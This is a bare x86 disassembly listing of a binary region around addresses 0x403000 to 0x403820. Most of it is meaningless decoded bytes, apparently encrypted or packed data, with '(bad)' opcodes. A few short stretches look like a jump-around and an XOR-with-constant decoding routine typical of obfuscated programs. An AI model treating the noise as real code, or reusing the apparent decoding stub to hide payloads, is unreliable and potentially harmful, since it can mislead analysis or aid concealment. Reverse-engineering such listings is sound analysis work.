  403021:	cmp    al,0x8d
  403023:	xchg   esi,eax
  403024:	cdq    
  403025:	push   0x77
  403027:	or     DWORD PTR [edi-0x44f0c5c3],eax
  40302d:	add    edi,ebx
  40302f:	(bad)  
  403030:	jmp    0xbf46:0x68e2d304
  403037:	push   ds
  403038:	cmp    dl,BYTE PTR [ebx+0x35]
  40303b:	adc    BYTE PTR [esi-0x5],ch
  40303e:	cwde   
  40303f:	mov    BYTE PTR [eax-0x7a],al
  403042:	test   eax,0x5164d896
  403047:	ret    0xab98
  40304a:	repnz sbb eax,0xf87bcf0a
  403050:	mov    bh,0x70
  403052:	and    al,0x49
  403054:	xlat   BYTE PTR ds:[ebx]
  403055:	push   ebx
  403056:	imul   edx,DWORD PTR [ecx],0xd85d2737
  40305c:	cs (bad) 
  40305f:	pop    esp
  403060:	mov    ax,WORD PTR [ebp-0x4]
  403064:	jmp    0x403415
  403069:	jl     0x403082
  40306b:	sub    al,0xf7
  40306d:	jge    0x402ffc
  40306f:	jge    0x40306e
  403071:	inc    edx
  403072:	sbb    dh,BYTE PTR [ebx]
  403074:	fstp   TBYTE PTR [ebp+eiz*4-0x77]
  403078:	popf   
  403079:	sahf   
  40307a:	sbb    bh,BYTE PTR [esi+0x7e]
  40307d:	xor    BYTE PTR [ecx+0x7e],0x7e
  403081:	push   es
  403082:	xchg   edx,eax
  403083:	lods   eax,DWORD PTR ds:[esi]
  403084:	sbb    esp,DWORD PTR [ebp+ebp*4+0x6701b330]
  40308b:	pusha  
  40308c:	test   al,0xc2
  40308e:	mov    edi,0x28bf4589
  403093:	shl    DWORD PTR [ebx],0xc4
  403096:	sub    BYTE PTR [ebx],bl
  403098:	mov    edx,0x830d4bf7
  40309d:	xchg   ebx,eax
  40309e:	(bad)  
  40309f:	sbb    eax,0x763f0753
  4030a4:	fcom   QWORD PTR [eax-0x7b7bb622]
  4030aa:	test   BYTE PTR [esi+0x7a],cl
  4030ad:	jns    0x403039
  4030af:	daa    
  4030b0:	rcr    DWORD PTR ds:0x9e542142,1
  4030b6:	mov    al,0x78
  4030b8:	lds    esp,FWORD PTR [ecx]
  4030ba:	sti    
  4030bb:	clc    
  4030bc:	in     al,dx
  4030bd:	shr    ch,1
  4030bf:	(bad)  
  4030c0:	test   bh,0x8f
  4030c3:	(bad)  
  4030c4:	loopne 0x40305c
  4030c6:	mov    dh,0x27
  4030c8:	inc    esp
  4030c9:	pop    ebp
  4030ca:	and    eax,0x480114b7
  4030cf:	cmp    DWORD PTR [ebx],edi
  4030d1:	sub    al,0xf7
  4030d3:	out    dx,al
  4030d4:	pop    ebp
  4030d5:	jae    0x403124
  4030d7:	mov    eax,0x1766189f
  4030dc:	cmp    ebp,edx
  4030de:	push   ebp
  4030df:	xchg   esi,eax
  4030e0:	mov    dh,0x73
  4030e2:	repnz mov bh,0xd3
  4030e5:	or     dh,BYTE PTR [ecx-0x1d44d051]
  4030eb:	jecxz  0x4030aa
  4030ed:	pop    ds
  4030ee:	mov    esp,0xb0bdb2ea
  4030f3:	aad    0xbb
  4030f5:	push   es
  4030f6:	inc    esp
  4030f7:	xor    esp,edx
  4030f9:	sub    eax,0x68bc43f2
  4030fe:	sbb    dh,dl
  403100:	push   es
  403101:	and    BYTE PTR [edi-0x3f968ba0],ch
  403107:	add    dl,BYTE PTR [edi+0x446bcce3]
  40310d:	retf   
  40310e:	fcomp  QWORD PTR [edi+0x41]
  403111:	sub    DWORD PTR [edx+0x6cd2349e],ecx
  403117:	in     al,0xca
  403119:	loop   0x40316a
  40311b:	jge    0x403104
  40311d:	mov    ds:0x150e2c3b,eax
  403122:	pop    ebp
  403123:	xchg   ah,bh
  403125:	add    eax,0x987fce71
  40312a:	repz jno 0x4030c8
  40312d:	repnz pop esi
  40312f:	mov    eax,ds:0x24ae68ab
  403134:	inc    ebx
  403135:	sbb    edi,0x4881d61c
  40313b:	out    dx,al
  40313c:	loopne 0x4030d8
  40313e:	adc    al,0x3
  403140:	or     eax,0xec21b8f0
  403145:	dec    esi
  403146:	pop    edi
  403147:	push   eax
  403148:	imul   ecx,DWORD PTR [ecx-0x2cc412d5],0x60
  40314f:	cmp    ecx,DWORD PTR [eax+0x30]
  403152:	sbb    BYTE PTR [ecx-0x609f4187],0x33
  403159:	lahf   
  40315a:	jb     0x40318b
  40315c:	jb     0x403155
  40315e:	(bad)  
  40315f:	idiv   BYTE PTR [ebp+edx*2-0x20cf17dd]
  403166:	retf   
  403167:	cmc    
  403168:	sbb    bl,cl
  40316a:	ret    
  40316b:	sub    DWORD PTR [edi-0x1748aee],esi
  403171:	test   DWORD PTR [ebp+0x70],ecx
  403174:	xchg   ebx,eax
  403175:	xor    bh,dl
  403177:	xchg   ebx,ecx
  403179:	mov    eax,ds:0x4e359f1b
  40317e:	xor    DWORD PTR [ecx-0x27617876],edx
  403184:	scas   al,BYTE PTR es:[edi]
  403185:	ins    DWORD PTR es:[edi],dx
  403186:	aam    0x69
  403188:	cmp    dl,BYTE PTR [edx-0x6a]
  40318b:	(bad)  
  40318c:	shl    DWORD PTR [eax-0x53b946d5],0xf0
  403193:	adc    dl,BYTE PTR [eax]
  403195:	pop    ss
  403196:	sub    dh,BYTE PTR [eax-0x153ed4f9]
  40319c:	jo     0x40315c
  40319e:	div    DWORD PTR [ebx]
  4031a0:	mov    dl,0x8f
  4031a2:	adc    cl,BYTE PTR ds:0x71e757f9
  4031a8:	rcr    bh,1
  4031aa:	jecxz  0x4031ef
  4031ac:	jl     0x4031e8
  4031ae:	mov    cl,0x37
  4031b0:	repnz xchg edx,eax
  4031b2:	cdq    
  4031b3:	push   ebx
  4031b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031b5:	push   0xc7603d61
  4031ba:	xor    DWORD PTR [esp+ecx*1-0xdc3f314],eax
  4031c1:	mov    es,WORD PTR [ebp-0x4c0885ba]
  4031c7:	pop    edx
  4031c8:	scas   eax,DWORD PTR es:[edi]
  4031c9:	cbw    
  4031cb:	and    al,0x64
  4031cd:	xchg   edi,eax
  4031ce:	sbb    DWORD PTR [esi+0x6c],0x2b371f90
  4031d5:	mov    edx,?
  4031d7:	sub    esp,ecx
  4031d9:	addr16 xchg edi,eax
  4031db:	mov    ecx,0x6678a8f5
  4031e0:	clc    
  4031e1:	ret    0x8994
  4031e4:	out    0x9f,eax
  4031e6:	mov    ah,0xc4
  4031e8:	dec    ebp
  4031e9:	cli    
  4031ea:	pop    ebx
  4031eb:	and    BYTE PTR [esp+eax*8],cl
  4031ee:	sub    BYTE PTR [edx-0x2a2daccc],0x73
  4031f5:	cdq    
  4031f6:	and    BYTE PTR [ecx-0x7acc6926],bh
  4031fc:	(bad)  
  4031fd:	punpckhbw mm6,QWORD PTR ss:[ebp-0xc05c018]
  403205:	call   0x188:0x1d33ec47
  40320c:	mov    ecx,ebx
  40320e:	loope  0x4031e2
  403210:	dec    esp
  403211:	push   ss
  403212:	push   ds
  403213:	add    eax,0xd8f35f33
  403218:	cdq    
  403219:	enter  0x8c68,0x9
  40321d:	inc    edx
  40321e:	test   DWORD PTR [esi-0x7b8d886d],eax
  403224:	iret   
  403225:	mov    ebx,0xc528e83e
  40322a:	popf   
  40322b:	cwde   
  40322c:	or     DWORD PTR [edx-0x25],esp
  40322f:	fld    TBYTE PTR [edi+edi*4+0x29a3ddc7]
  403236:	mov    ds:0x358a2bac,eax
  40323b:	and    DWORD PTR [ebp-0x14],0x20222040
  403242:	sti    
  403243:	add    al,0x15
  403245:	femms  
  403247:	sti    
  403248:	cwde   
  403249:	xor    ch,BYTE PTR [esi+0x23e0a8eb]
  40324f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403250:	clc    
  403251:	ficomp WORD PTR [eax]
  403253:	cmp    ah,BYTE PTR [edx+0x1b]
  403256:	fisub  WORD PTR [eax-0x73]
  403259:	fdivr  st(7),st
  40325b:	mov    bh,0x3a
  40325d:	aad    0x72
  40325f:	push   eax
  403260:	dec    esi
  403261:	stc    
  403262:	(bad)  
  403263:	fs dec eax
  403265:	jbe    0x403260
  403267:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403268:	xchg   DWORD PTR [edx+eax*8-0x6d],edx
  40326c:	jne    0x40323c
  40326e:	cmp    eax,0x7278dd71
  403273:	cmp    al,0xa2
  403275:	pop    ebx
  403276:	jmp    FWORD PTR [edi]
  403278:	push   0x94aa1993
  40327d:	jge    0x40321c
  40327f:	push   edi
  403280:	mov    ebx,0x14957666
  403285:	sub    ebp,DWORD PTR [edx+0x31]
  403288:	push   eax
  403289:	or     eax,0xb715bf83
  40328e:	mov    cl,0x55
  403290:	mov    esp,DWORD PTR ds:0x7cdc383a
  403296:	mov    cl,0x8f
  403298:	mov    dl,0x4d
  40329a:	neg    BYTE PTR [edx+0x4]
  40329d:	retf   
  40329e:	xlat   BYTE PTR ds:[ebx]
  40329f:	sub    DWORD PTR [esi-0x2d4574bc],esi
  4032a5:	mov    bh,0xce
  4032a7:	das    
  4032a8:	rcr    ah,1
  4032aa:	mov    cl,0xb6
  4032ac:	ror    DWORD PTR [eax-0x7ac894a0],cl
  4032b2:	sub    DWORD PTR [bx+si+0x72],edi
  4032b6:	loope  0x40329d
  4032b8:	push   ds
  4032b9:	sub    eax,0xef5aa8ce
  4032be:	sub    DWORD PTR [edi+ebp*2-0x613de7ed],edi
  4032c5:	adc    ebx,DWORD PTR [ecx-0x4e]
  4032c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032ca:	fld    QWORD PTR [edi]
  4032cc:	and    eax,ebp
  4032ce:	in     al,dx
  4032cf:	in     eax,dx
  4032d0:	mov    esp,0xcba1354b
  4032d5:	push   edx
  4032d6:	push   0xf244dd50
  4032db:	mov    ebp,0x21583066
  4032e0:	rcl    BYTE PTR [eax-0xf],0x30
  4032e4:	outs   dx,DWORD PTR ds:[esi]
  4032e5:	mov    al,ds:0x141b8734
  4032ea:	(bad)  
  4032eb:	ja     0x403296
  4032ed:	icebp  
  4032ee:	sbb    eax,0x7f4344
  4032f3:	adc    bh,BYTE PTR [edi-0xf6461c7]
  4032f9:	div    BYTE PTR [esi-0x46449ff8]
  4032ff:	mov    ch,0x4e
  403301:	shr    BYTE PTR [esi-0x39],0x2a
  403305:	xor    bh,BYTE PTR [ebx+0x42]
  403308:	push   0xf3710b9b
  40330d:	mov    ecx,0xe9c66bac
  403312:	cdq    
  403313:	sub    BYTE PTR [edx],bh
  403315:	xor    BYTE PTR [eax-0x17f1ede9],0xf6
  40331c:	lods   eax,DWORD PTR ds:[esi]
  40331d:	xchg   edi,eax
  40331e:	lock ja 0x4032d2
  403321:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403322:	jno    0x4032cb
  403324:	fstp   TBYTE PTR [ecx]
  403326:	popa   
  403327:	push   edx
  403328:	popa   
  403329:	ret    0xbc5f
  40332c:	sbb    al,0x28
  40332e:	mov    eax,ds:0x303ac32b
  403333:	sbb    al,0x15
  403335:	pop    eax
  403336:	fs push 0xffffff92
  403339:	mov    edx,0xf870a28d
  40333e:	retf   
  40333f:	xchg   ebp,eax
  403340:	or     DWORD PTR [edx+0x50de68cc],ecx
  403346:	(bad)  
  403347:	popf   
  403348:	imul   edx,DWORD PTR [edx+ebx*2-0x3e220c6c],0x4b
  403350:	pop    ss
  403351:	mov    ebp,0xd6fa87de
  403356:	or     BYTE PTR [edx+edx*8],dh
  403359:	fist   WORD PTR [eax+0x76]
  40335c:	shl    BYTE PTR [edi+esi*4+0x37],1
  403360:	jle    0x4033b7
  403362:	loopne 0x403335
  403364:	jmp    0x403372
  403366:	test   DWORD PTR [edi],ebx
  403368:	xchg   edx,eax
  403369:	hlt    
  40336a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40336b:	push   ecx
  40336c:	sbb    DWORD PTR [eax+0x58],ebp
  40336f:	mov    al,0x88
  403371:	inc    edx
  403372:	push   cs
  403373:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403374:	mov    ds:0x4351aba,al
  403379:	xchg   esi,eax
  40337a:	mov    ebx,es
  40337c:	mov    eax,0x97a5204
  403381:	jle    0x403400
  403383:	push   ds
  403384:	pop    edx
  403385:	pop    ss
  403386:	pop    ecx
  403387:	js     0x403334
  403389:	je     0x40335b
  40338b:	xlat   BYTE PTR ds:[ebx]
  40338c:	addr16 int 0xcd
  40338f:	lods   eax,DWORD PTR ds:[esi]
  403390:	(bad)
  403393:	retf   
  403394:	fld    TBYTE PTR [ebp*4+0x38d3c456]
  40339b:	mov    esp,0xb267db5b
  4033a0:	add    al,0x5
  4033a2:	lock scas eax,DWORD PTR es:[edi]
  4033a4:	arpl   si,cx
  4033a6:	dec    eax
  4033a7:	and    DWORD PTR [esi],ebx
  4033a9:	xchg   ecx,eax
  4033aa:	pop    es
  4033ab:	cs cmp ebp,0x7b
  4033af:	push   0xffffff96
  4033b1:	adc    BYTE PTR ds:0xb5a7c655,al
  4033b7:	cmc    
  4033b8:	aam    0x91
  4033ba:	jmp    FWORD PTR [eax+0x1c]
  4033bd:	data16 js 0x403381
  4033c0:	in     al,0xb5
  4033c2:	rol    dh,cl
  4033c4:	cwde   
  4033c5:	pop    ds
  4033c6:	nop
  4033c7:	cmp    edi,edx
  4033c9:	(bad)
  4033cc:	loope  0x403425
  4033ce:	out    0x4d,al
  4033d0:	jecxz  0x40335c
  4033d2:	das    
  4033d3:	pop    edi
  4033d4:	pusha  
  4033d5:	inc    eax
  4033d6:	dec    eax
  4033d7:	sbb    eax,0x62409aa5
  4033dc:	aad    0x84
  4033de:	push   edi
  4033df:	pop    es
  4033e0:	mov    ah,BYTE PTR [eax-0x1d0e7ae1]
  4033e6:	loope  0x403420
  4033e8:	adc    eax,0x94e6e5a9
  4033ed:	and    esp,0x186e6258
  4033f3:	fld    QWORD PTR [ebp+0x58]
  4033f6:	jne    0x4033a5
  4033f8:	jp     0x4033b1
  4033fa:	in     al,dx
  4033fb:	jge    0x4033f5
  4033fd:	popa   
  4033fe:	pop    eax
  4033ff:	leave  
  403400:	mov    eax,0x31059026
  403405:	les    eax,FWORD PTR [ecx]
  403407:	cmp    BYTE PTR [esp+edi*1],cl
  40340a:	mov    eax,ds:0x816b3f0f
  40340f:	sbb    BYTE PTR [ebx],ch
  403411:	adc    eax,DWORD PTR [ebx-0x52]
  403414:	push   edi
  403415:	mov    edi,DWORD PTR [ebp+0x8]
  403418:	mov    edi,DWORD PTR [edi]
  40341a:	mov    edx,0x8a40
  40341f:	xor    ax,dx
  403422:	jmp    0x4037d3
  403427:	nop
  403428:	cdq    
  403429:	fst    QWORD PTR [ecx-0x6683aa03]
  40342f:	xlat   BYTE PTR ds:[ebx]
  403430:	push   cs
  403431:	mov    cl,0xfe
  403433:	xor    ah,bl
  403435:	out    0x8,al
  403437:	and    bl,BYTE PTR [esi]
  403439:	jle    0x4034b9
  40343b:	xor    BYTE PTR [ecx+0x7e],0x7e
  40343f:	sbb    BYTE PTR [eax-0x67d94bb8],cl
  403445:	in     eax,0xf
  403447:	xor    eax,0x66e25e50
  40344c:	lods   eax,DWORD PTR ds:[esi]
  40344d:	push   esi
  40344e:	sub    eax,0x17587b34
  403453:	hlt    
  403454:	mov    al,ds:0xc53d814b
  403459:	bnd jne 0x403417
  40345c:	or     DWORD PTR ds:[edi-0x49],edx
  403460:	sub    BYTE PTR [edx+0x2c01b9d9],al
  403466:	jbe    0x40346d
  403468:	push   0x99766d25
  40346d:	je     0x4034a2
  40346f:	mov    ds:0xb4559602,eax
  403474:	(bad)  
  403476:	inc    esp
  403477:	mov    eax,ds:0x3e7330fc
  40347c:	lea    ebp,cs:[edx]
  40347f:	xchg   ebp,edi
  403481:	out    dx,eax
  403482:	test   DWORD PTR [esi],0xb6d60568
  403488:	jle    0x40344e
  40348a:	pop    ebx
  40348b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40348c:	(bad)  
  40348d:	fisubr WORD PTR [edx+eax*1+0x1c]
  403491:	adc    eax,0x1dc09f3e
  403496:	push   eax
  403497:	js     0x40348a
  403499:	or     BYTE PTR [ebx],0x37
  40349c:	outs   dx,BYTE PTR ds:[esi]
  40349d:	and    DWORD PTR [ecx-0xd],esi
  4034a0:	fnstcw WORD PTR [ebp+0x1b89a50c]
  4034a6:	cmp    edx,DWORD PTR [ebp-0x13]
  4034a9:	xor    esp,ecx
  4034ab:	popa   
  4034ac:	lods   eax,DWORD PTR ds:[esi]
  4034ad:	sub    BYTE PTR [ebp+0x18d5a014],bh
  4034b3:	inc    esp
  4034b4:	jns    0x403445
  4034b6:	test   eax,0x961c6c49
  4034bb:	std    
  4034bc:	inc    esp
  4034bd:	daa    
  4034be:	pop    esi
  4034bf:	mov    dh,0xa5
  4034c1:	test   al,0x60
  4034c3:	and    esp,esp
  4034c5:	add    BYTE PTR [edi-0x62],dl
  4034c8:	or     al,0xb2
  4034ca:	xlat   BYTE PTR ds:[ebx]
  4034cb:	ret    
  4034cc:	xchg   ebp,eax
  4034cd:	fs (bad) 
  4034cf:	dec    ebx
  4034d0:	pushf  
  4034d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034d2:	push   esp
  4034d3:	imul   edi,DWORD PTR [eax-0x563495b5],0x36
  4034da:	sbb    al,0x8f
  4034dc:	push   ss
  4034dd:	pop    ss
  4034de:	sbb    BYTE PTR [esi+ebx*8-0x7],0xd8
  4034e3:	lea    ecx,[edx]
  4034e5:	dec    ebx
  4034e6:	xchg   edi,eax
  4034e7:	mov    esi,0x3083f3ae
  4034ec:	inc    ebx
  4034ed:	mov    ds:0xff091629,al
  4034f2:	fisttp WORD PTR [edi+0x1]
  4034f5:	sbb    ecx,ebx
  4034f7:	cmp    esp,DWORD PTR [ecx-0x7de355ac]
  4034fd:	int3   
  4034fe:	or     DWORD PTR [edx-0x2e],esi
  403501:	repnz xor DWORD PTR [ebx-0x6973b251],ebx
  403508:	adc    BYTE PTR [edx-0xb],cl
  40350b:	or     esp,DWORD PTR [edi+0x73b8a1cd]
  403511:	and    DWORD PTR [ecx+0x50f19462],eax
  403517:	mov    bh,0xb9
  403519:	add    eax,0x53454069
  40351e:	dec    esi
  40351f:	jp     0x403524
  403521:	sbb    ch,BYTE PTR [esi+ecx*2-0x56]
  403525:	push   0x54
  403527:	jnp    0x4034dc
  403529:	jmp    FWORD PTR [esi-0x24]
  40352c:	add    dl,BYTE PTR [edi-0x656504bd]
  403532:	inc    ebp
  403533:	leave  
  403534:	ds push esi
  403536:	add    DWORD PTR [esp+eax*8+0x2a],ecx
  40353a:	iret   
  40353b:	push   0xffffffb5
  40353d:	xor    dl,BYTE PTR ds:0x5cd4c6f4
  403543:	xor    cl,BYTE PTR [edi+0x16da6a34]
  403549:	lock ds jo 0x403515
  40354d:	xchg   ebp,eax
  40354e:	pop    ds
  40354f:	xor    ah,BYTE PTR [edx+0x68]
  403552:	sub    dh,dl
  403554:	data16 cmp ah,dh
  403557:	sbb    cl,BYTE PTR [esi+0x29]
  40355a:	fisttp DWORD PTR [edx-0x2d]
  40355d:	cmp    dh,BYTE PTR [edi]
  40355f:	fs fcmovbe st,st(4)
  403562:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403563:	mov    edi,0x8bbc0cc5
  403568:	mov    edx,0x5b4adb02
  40356d:	shl    edx,1
  40356f:	pop    edx
  403570:	imul   dh
  403572:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403573:	adc    eax,0x4ae41f26
  403578:	lahf   
  403579:	sti    
  40357a:	loop   0x4035ed
  40357c:	stos   BYTE PTR es:[edi],al
  40357d:	les    edx,FWORD PTR [ecx+0xce39f8c]
  403583:	ins    BYTE PTR es:[edi],dx
  403584:	shr    BYTE PTR [edx+0x600213cb],1
  40358a:	sbb    esi,edi
  40358c:	dec    edx
  40358d:	mov    ds:0xbc1748ce,eax
  403592:	arpl   WORD PTR [esi],di
  403594:	xor    bh,ch
  403596:	int3   
  403597:	test   al,0x97
  403599:	cli    
  40359a:	daa    
  40359b:	sub    BYTE PTR [edx-0x4dac7cb3],al
  4035a1:	ret    
  4035a2:	xor    al,0x5d
  4035a4:	aam    0x60
  4035a6:	jp     0x4035d7
  4035a8:	mov    al,ds:0xf12cdbd6
  4035ad:	fs mov ecx,0x53a984cc
  4035b3:	sub    dl,BYTE PTR [ebx-0x62]
  4035b6:	jp     0x403590
  4035b8:	mov    bh,0x54
  4035ba:	and    eax,0x5a525a24
  4035bf:	xchg   esi,ecx
  4035c1:	xchg   edi,eax
  4035c2:	in     eax,0xc
  4035c4:	xchg   esi,eax
  4035c5:	neg    DWORD PTR [edx+0x788266e6]
  4035cb:	(bad)  [esp+edi*4+0x3e]
  4035cf:	sti    
  4035d0:	sbb    al,0xda
  4035d2:	into   
  4035d3:	stos   BYTE PTR es:[edi],al
  4035d4:	jecxz  0x4035d1
  4035d6:	jecxz  0x40356a
  4035d8:	pop    eax
  4035d9:	test   al,0x12
  4035db:	mov    esi,0x4d0e7cf3
  4035e0:	mov    eax,ds:0x91efa3e
  4035e5:	sub    dl,dh
  4035e7:	push   esp
  4035e8:	xor    BYTE PTR [ecx-0x14],ah
  4035eb:	mov    cl,0x2d
  4035ed:	sub    dh,0x3d
  4035f0:	inc    esi
  4035f1:	dec    edi
  4035f2:	scas   eax,DWORD PTR es:[edi]
  4035f3:	data16 jnp 0x403668
  4035f6:	lods   eax,DWORD PTR ds:[esi]
  4035f7:	stos   BYTE PTR es:[edi],al
  4035f8:	or     DWORD PTR [ecx-0x5e],ebx
  4035fb:	xchg   esi,eax
  4035fc:	xor    BYTE PTR [ecx],dl
  4035fe:	mov    ds:0x523b1875,al
  403603:	fsubr  DWORD PTR [eax+eiz*8-0x16]
  403607:	xchg   ebp,eax
  403608:	jb     0x403644
  40360a:	ret    
  40360b:	sub    eax,0x6289512c
  403610:	out    0xe1,al
  403612:	mov    dh,0xc8
  403614:	js     0x4035f9
  403616:	aas    
  403617:	add    edi,eax
  403619:	call   0x30141b05
  40361e:	icebp  
  40361f:	and    ch,ah
  403621:	pop    ds
  403622:	xor    ebp,DWORD PTR [eax]
  403624:	pop    es
  403625:	jne    0x403631
  403627:	hlt    
  403628:	or     dh,BYTE PTR [eax]
  40362a:	lds    esp,FWORD PTR [edi-0x4e60e563]
  403630:	adc    eax,0xb963a2b4
  403635:	sbb    eax,DWORD PTR [esi]
  403637:	pop    ebx
  403638:	loopne 0x40368a
  40363a:	sti    
  40363b:	xor    eax,0x8714ee59
  403640:	lea    ebx,[edi+0x64]
  403643:	push   ecx
  403644:	mov    dh,0xcb
  403646:	pop    edi
  403647:	loop   0x40366b
  403649:	aas    
  40364a:	loopne 0x4035e8
  40364c:	mov    esp,0x95cbf50b
  403651:	or     eax,0x9dbbc2cc
  403656:	dec    esi
  403657:	test   DWORD PTR [edi+esi*2+0x646a38e7],ebx
  40365e:	loope  0x40366b
  403660:	daa    
  403661:	lea    ebx,[eax+0x7]
  403664:	aad    0x6
  403666:	adc    bh,BYTE PTR [ebx]
  403668:	jmp    0xd973:0xfd497379
  40366f:	inc    edx
  403670:	lds    esp,FWORD PTR [esi+0x42616a3e]
  403676:	xchg   DWORD PTR [ebx],ecx
  403678:	addr16 cmc 
  40367a:	pop    ebp
  40367b:	jo     0x403628
  40367d:	push   0x59
  40367f:	mov    bh,0x2c
  403681:	icebp  
  403682:	dec    ebp
  403683:	sbb    BYTE PTR [edx],dh
  403685:	or     BYTE PTR [ecx+0x41],dh
  403688:	into   
  403689:	xchg   ebx,eax
  40368a:	or     al,0x28
  40368c:	aas    
  40368d:	xchg   esp,eax
  40368e:	pop    ebx
  40368f:	sbb    eax,0xb63dcca
  403694:	(bad)  
  403695:	pop    eax
  403696:	mov    cs,WORD PTR [edx-0x3c]
  403699:	fiadd  DWORD PTR [edx]
  40369b:	dec    ebp
  40369c:	or     edi,DWORD PTR [edi+ebp*1+0x5d]
  4036a0:	aam    0x4a
  4036a2:	dec    edi
  4036a3:	mov    WORD PTR [ecx+0x4e],?
  4036a6:	lods   eax,DWORD PTR ds:[esi]
  4036a7:	sub    esp,DWORD PTR [ebp+0x4b]
  4036aa:	push   ebx
  4036ab:	pop    es
  4036ac:	cs dec edi
  4036ae:	clc    
  4036af:	jbe    0x40371d
  4036b1:	jecxz  0x4036d2
  4036b3:	test   BYTE PTR [esi],bh
  4036b5:	aas    
  4036b6:	adc    DWORD PTR [ebp+edi*2-0x73],0xffffff82
  4036bb:	shl    DWORD PTR [edx],0xe5
  4036be:	fild   QWORD PTR [ecx]
  4036c0:	loop   0x403694
  4036c2:	mov    ebp,0x36d6e632
  4036c7:	mov    eax,0xda398fc8
  4036cc:	xor    eax,0xeb83d290
  4036d1:	add    dl,BYTE PTR [ebp-0x51]
  4036d4:	shl    BYTE PTR [edx-0x5f385713],0x5c
  4036db:	or     dh,BYTE PTR [esi-0x4e]
  4036de:	or     eax,0x2eeb9c71
  4036e3:	cdq    
  4036e4:	push   es
  4036e5:	dec    esp
  4036e6:	(bad)  
  4036e7:	mov    ah,0x8
  4036e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036ea:	push   ss
  4036eb:	shl    BYTE PTR [eax+0x6f],cl
  4036ee:	push   edi
  4036ef:	mov    cl,0x72
  4036f1:	adc    BYTE PTR [ecx-0x33698c3c],dh
  4036f7:	pop    ss
  4036f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036f9:	cs cmp esp,esi
  4036fc:	sar    DWORD PTR [ecx+ebp*1+0x2],cl
  403700:	push   ss
  403701:	inc    ecx
  403702:	dec    ebp
  403703:	mov    dl,0x60
  403705:	hlt    
  403706:	xor    BYTE PTR [ebp+0x66],ah
  403709:	push   0xffffffbd
  40370b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40370c:	icebp  
  40370d:	mov    ss,WORD PTR [ebp-0x48]
  403710:	cmc    
  403711:	in     al,0x10
  403713:	retf   
  403714:	cld    
  403715:	imul   esp,DWORD PTR [ecx+0x6aac6447],0x53d936f3
  40371f:	rcr    DWORD PTR [edi-0x7],0x93
  403723:	(bad)  
  403724:	fnstcw WORD PTR [edx+ebp*4-0x5260b048]
  40372b:	dec    esp
  40372c:	mov    ds:0x7ec88157,eax
  403731:	add    dl,BYTE PTR [esp+eax*1-0x18]
  403735:	adc    DWORD PTR [eax],0xb8ed3c7f
  40373b:	pop    ds
  40373c:	retf   0x504f
  40373f:	je     0x403714
  403741:	call   0xd1887f63
  403746:	icebp  
  403747:	push   es
  403748:	or     ax,0xa672
  40374c:	mov    dl,cl
  40374e:	rcl    esi,cl
  403750:	jne    0x40373d
  403752:	sahf   
  403753:	sub    ebp,DWORD PTR [edi+0xc]
  403756:	(bad)  
  403757:	aam    0x80
  403759:	jmp    0x76f4e9a8
  40375e:	in     al,dx
  40375f:	sbb    ecx,ecx
  403761:	aad    0x4b
  403763:	sbb    DWORD PTR [ecx-0x2c],ebx
  403766:	cs dec edi
  403768:	pushf  
  403769:	and    eax,edx
  40376b:	jno    0x403721
  40376d:	popf   
  40376e:	mov    ebp,0xe6ef02d5
  403773:	push   ebx
  403774:	mov    eax,0xc1522c60
  403779:	in     eax,dx
  40377a:	scas   al,BYTE PTR es:[edi]
  40377b:	pop    ebx
  40377c:	enter  0x7e33,0xaa
  403780:	(bad)  
  403781:	je     0x40372c
  403783:	mov    WORD PTR [ecx+0x220763e],ss
  403789:	les    ebx,FWORD PTR [eax-0x37]
  40378c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40378d:	out    0xd,al
  40378f:	and    ecx,0xefc2a49c
  403795:	pop    ecx
  403796:	(bad)  
  403798:	cli    
  403799:	jb     0x4037f7
  40379b:	ficomp WORD PTR [edx]
  40379d:	pop    ss
  40379e:	adc    dh,cl
  4037a0:	fwait
  4037a1:	(bad)  
  4037a2:	shr    BYTE PTR [eax-0x6dd40ad4],1
  4037a8:	dec    esp
  4037a9:	lds    edx,FWORD PTR [edi]
  4037ab:	mov    al,ds:0xf090ce75
  4037b0:	dec    edx
  4037b1:	shr    ah,cl
  4037b3:	xchg   ecx,eax
  4037b4:	pop    ebp
  4037b5:	arpl   ax,ax
  4037b7:	repnz fs or eax,0x1ef04332
  4037be:	adc    edx,esi
  4037c0:	add    bh,BYTE PTR [eax-0x67305d0c]
  4037c6:	popa   
  4037c7:	leave  
  4037c8:	in     al,0xb5
  4037ca:	pushf  
  4037cb:	call   0x9818:0x221d202d
  4037d2:	jecxz  0x40378e
  4037d4:	push   es
  4037d5:	cmp    eax,DWORD PTR [eax]
  4037d7:	add    BYTE PTR [esi+0x3],ah
  4037da:	ret    0x3b66
  4037dd:	pop    es
  4037de:	je     0x40382b
  4037e4:	mov    eax,DWORD PTR [ebp-0x14]
  4037e7:	xor    eax,ecx
  4037e9:	add    eax,esi
  4037eb:	mov    DWORD PTR [ebp-0x24],eax
  4037ee:	mov    eax,DWORD PTR [ebp-0x28]
  4037f1:	mov    di,WORD PTR [ebp-0x2c]
  4037f5:	mov    ebx,0x8a40
  4037fa:	xor    di,bx
  4037fd:	add    di,dx
  403800:	movzx  edx,di
  403803:	mov    edi,DWORD PTR [ebp-0x8]
  403806:	xor    edi,ecx
  403808:	lea    edx,[edx+edi*1+0x32729d]
  40380f:	add    DWORD PTR [eax],edx
  403811:	mov    eax,DWORD PTR [ebp-0x20]
  403814:	mov    edx,DWORD PTR [ebp-0x8]
  403817:	mov    edi,DWORD PTR [ebp-0x24]
  40381a:	xor    edx,ecx
  40381c:	add    edx,esi
  40381e:	imul   edx,edi
